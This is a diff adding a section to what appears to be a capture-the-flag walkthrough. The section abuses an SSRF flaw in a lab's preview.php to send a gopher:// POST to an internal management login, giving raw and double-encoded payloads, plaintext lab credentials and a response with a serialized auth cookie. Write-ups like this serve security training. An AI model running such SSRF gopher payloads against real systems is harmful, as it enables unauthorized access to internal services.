@@ -160,3 +160,46 @@ P: L1br4r1AN!!
 
 ![Credentials](images/18-html.png)
 
+## Flag 2 ⛳️
+
+20. In the `/management`, There is a nice Login form: `http://10.10.92.204/preview.php?url=http://127.0.0.1/management/` 🔐
+
+![Management](images/06-management.png)
+
+21. We Have 2 Fields, `username` and `password`. Let's Login using `gopher://`. 📝
+```
+gopher://127.0.0.1:80/_POST /management/index.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Connection: close
+
+username=librarian&password=L1br4r1AN%21%21
+```
+
+![management login](images/21-login.png)
+
+**Attention**: Convert `&` to `%26` on burp when sending.
+
+```
+gopher://127.0.0.1:80/_POST%2520/management/%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250AContent-Length:%252043%250D%250A%250D%250Ausername=librarian%26password=L1br4r1AN%252521%252521
+```
+
+
+22. Response redirects into `/2fa.php` with Cookies: 🍪
+```
+HTTP/1.1 302 Found
+Date: Mon, 20 Oct 2025 14:44:32 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: PHPSESSID=qrjv6vf9nk2oh0bgmqomalmchh; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: auth_token=O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A0%3B%7D; expires=Mon, 20 Oct 2025 15:44:32 GMT; Max-Age=3600; path=/
+Location: 2fa.php
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+```
+
+![redirect to 2fa](images/22-login-redir-2fa.png)
+
